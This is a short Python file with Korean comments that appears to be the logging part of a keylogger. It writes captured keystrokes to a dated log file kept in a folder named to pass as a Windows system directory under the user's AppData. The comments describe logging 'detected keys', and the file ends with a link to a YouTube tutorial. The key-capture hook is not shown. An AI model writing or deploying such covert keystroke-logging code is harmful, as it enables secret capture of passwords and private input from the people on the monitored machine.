import os
import getpass
from datetime import datetime

# 사용자 계정명 파싱
username = getpass.getuser()

# 로그 파일의 이름을 가져오는 함수 (ex > 2019-12-20.log)
def getlogfilename():
    now = datetime.now()
    now = str(now).split()[0]
    filename = now + ".log"
    return filename

# 로그 파일의 경로를 가져오는 함수
def getlogfilepath(filename):
    dirpath = os.path.join("C:\\Users", username, "AppData\\Roaming\\Windows")
    if not (os.path.isdir(dirpath)):
        os.makedirs(os.path.join(dirpath))
    filepath = os.path.join("C:\\Users", username, "AppData\\Roaming\\Windows", filename)
    return filepath

# 감지한 키를 로깅하는 함수
def logger(key):
    key = str(key).replace("'", '') # 문자열 형 변환, 작은따움표 쓸데없는 문자 제거
    f = open(getlogfilepath(getlogfilename()), mode="at", encoding="utf-8") # 파일 추가 모드
    f.write(key)
    f.close()

# 파일의 크기 감지 함수
def getfilesize():
    filesize = os.path.getsize(getlogfilepath(getlogfilename()))
    return filesize

# https://www.youtube.com/watch?v=BkMtK-cyyEE&list=WL&index=3&t=4s